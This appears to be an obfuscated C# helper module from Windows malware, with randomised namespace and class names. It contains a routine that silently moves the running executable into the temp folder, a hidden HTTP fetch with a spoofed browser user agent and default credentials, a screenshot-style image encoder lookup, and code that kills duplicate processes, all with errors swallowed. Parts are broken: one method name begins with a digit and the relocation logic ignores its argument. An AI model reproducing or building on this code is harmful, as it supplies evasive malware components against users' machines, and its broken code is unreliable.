using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using UHyll;

namespace JSW1fecBOy
{
	public static class Ponsp
	{
		public static void SelfRelocateExecutable(string targetPath)
		{
			string currentLocation = Assembly.GetExecutingAssembly().Location;
			if (currentLocation == targetPath)
			{
				return;
			}
			try
			{
				string tempFilePath = Path.Combine(Path.GetTempPath(), "G" + DateTime.Now.Millisecond.ToString() + ".tmp");
				string sourcePath = Ponsp.TruncateString(Application.ExecutablePath, FNu.GetModuleFileName(0, Application.ExecutablePath, 256));
				FNu.MoveFile(sourcePath, tempFilePath, 8L);
			}
			catch
			{

			}
		}

		private static string TruncateString(string input, int length)
		{
			if (length <= 0 || input.Length == 0)
			{
				return "";
			}

			if (input.Length <= length)
			{
				return input;
			}

			return input.Substring(0, length);
		}

		public static string FetchHttpResponse()
		{
			string result;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("");
				httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
				httpWebRequest.KeepAlive = true;
				httpWebRequest.Timeout = 10000;
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.MaximumAutomaticRedirections = 50;
				httpWebRequest.Method = "GET";
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					if (((HttpWebResponse)response).StatusDescription == "OK")
					{
						using (Stream responseStream = response.GetResponseStream())
						{
							StreamReader streamReader = new StreamReader(responseStream);
							return streamReader.ReadToEnd();
						}
					}
				}
				result = "";
			}
			catch
			{
				result = "";
			}
			return result;
		}
		public static ImageCodecInfo GetImageEncoder(ImageFormat format)
		{
			ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();

			foreach (ImageCodecInfo encoder in encoders)
			{
				if (encoder.FormatID == format.Guid)
				{
					return encoder;
				}
			}

			return null;
		}

		public static void TerminateDuplicateProcess()
		{
			try
			{
				string processName = Process.GetCurrentProcess().ProcessName;
				int id = Process.GetCurrentProcess().Id; 
				Process[] processesByName = Process.GetProcessesByName(processName);
				foreach (Process process in processesByName) 
				{
					if (process.Id != id) 
					{
						process.Kill();
					}
				}
			}
			catch
			{
			}
		}
	

		public static IList<T> 6ujEfs<T>(IList<T> list)
		{
			using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
			{
				int n = list.Count;
				while (n > 1)
				{
					byte[] buffer = new byte[1];
				rng.GetBytes(buffer);
					int k = buffer[0] % n;
				n--;
					T temp = list[k];
				list[k] = list[n];
					list[n] = temp;
				}
		}
		return list;
		}
	}
}
